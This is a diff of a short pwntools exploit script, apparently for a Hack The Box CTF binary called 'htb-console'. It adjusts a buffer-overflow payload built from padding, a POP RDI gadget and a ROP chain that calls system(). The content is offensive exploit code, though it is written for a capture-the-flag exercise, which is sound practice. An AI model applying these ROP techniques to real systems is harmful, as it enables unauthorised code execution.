@@ -1,7 +1,5 @@
-
 from pwn import *
 
-#context.log_level = 'DEBUG'
 context(os='linux', arch='amd64')
 
 executable = '/home/kali/Downloads/htb-console'
@@ -18,6 +16,7 @@ rop = ROP(elf)
 
 #rop.call(rop.find_gadget(['pop rdi', 'ret']))
 #rop.call(0x402107)
+rop.raw(0x402107)
 rop.call(elf.symbols["system"])
 info("%#x ROP", u64(rop.chain()))
 
@@ -32,11 +31,8 @@ info("%#x POP RDI", u64(POP_RDI))
 payload = [
     b"A" * padding_length,
     POP_RDI,
-    execute_string,
     rop.chain()
 ]
-
-print(payload)
 
 payload = b"".join(payload)
 
